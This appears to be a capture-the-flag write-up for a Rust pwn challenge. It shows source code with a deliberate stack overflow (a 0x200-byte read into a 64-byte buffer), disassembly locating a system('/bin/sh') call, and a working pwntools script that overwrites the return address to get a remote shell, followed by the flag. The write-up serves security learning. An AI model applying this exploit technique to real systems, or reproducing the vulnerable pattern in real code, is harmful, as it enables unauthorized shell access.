# Pwn

```
Stumbled upon Rust recently, still learning the ropes...

nc 0.cloud.chals.io 31984 
```

Source code is provided in attachment:

```rust
use std::os::raw::{c_char, c_int, c_void};

#[link_section = ".text.patch"]
static PATCHPOINT: [u8; 2] = [0x5F, 0xC3];

#[repr(C)]
struct FILE {
    _priv: [u8; 0],
}

extern "C" {
    fn read(fd: c_int, buf: *mut c_void, count: usize) -> isize;
    fn puts(s: *const c_char) -> c_int;
    fn system(cmd: *const c_char) -> c_int;
    fn exit(code: c_int) -> !;
    static mut stdout: *mut FILE;
    fn setbuf(stream: *mut FILE, buf: *mut c_char);
}

const WELCOME: &[u8] = b"Welcome to my first Rust program!\n\0";
const PROMPT: &[u8] = b"Say something:\n\0";
const BYE: &[u8] = b"Bye!\n\0";
const NOPE: &[u8] = b"nope\n\0";
const BINSH: &[u8] = b"/bin/sh\0";

#[no_mangle]
pub extern "C" fn win(key: u64) {
    unsafe {
        if key != 0xdeadbeefcafebabeu64 {
            puts(NOPE.as_ptr() as *const c_char);
            exit(1);
        }
        system(BINSH.as_ptr() as *const c_char);
    }
}

pub extern "C" fn vuln() {
    let mut buf = [0u8; 64];
    unsafe {
        setbuf(stdout, std::ptr::null_mut());
        puts(PROMPT.as_ptr() as *const c_char);
        read(0, buf.as_mut_ptr() as *mut c_void, 0x200);
    }
}

fn main() {
    unsafe {
        puts(WELCOME.as_ptr() as *const c_char);
    }
    vuln();
    unsafe {
        puts(BYE.as_ptr() as *const c_char);
    }
}

```

There is a stack overflow in `read(0, buf.as_mut_ptr() as *mut c_void, 0x200);`. We can override the return address to `system`, found via [Binary Ninja](https://binary.ninja):

```
0023c4f3  488d3de66dfcff     lea     rdi, [rel data_2032e0]  {"/bin/sh"}
0023c4fa  ff1558620a00       call    qword [rel system]
0023c500  5d                 pop     rbp {__saved_rbp}
0023c501  c3                 retn     {__return_addr}
```

Attach script:

```python
from pwn import *

elf = ELF("./chall")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", log_level="debug")

# p = process(["./chall"])
p = remote("0.cloud.chals.io", 31984)

# gdb.attach(p)
# pause()

p.recvuntil("something:")
# override lowest 2 bytes of return address to 0xc4f3
buf = (
    b"A" * 0x48
    + bytes([0xf3, 0xc4])
)
p.send(buf)
p.interactive()
```

Flag: `FortID{1_D0n'7_Th1nk_Th1s_1s_H0w_Y0u'r3_Supp0s3d_T0_Wr1t3_C0d3_1n_Ru5t}`.
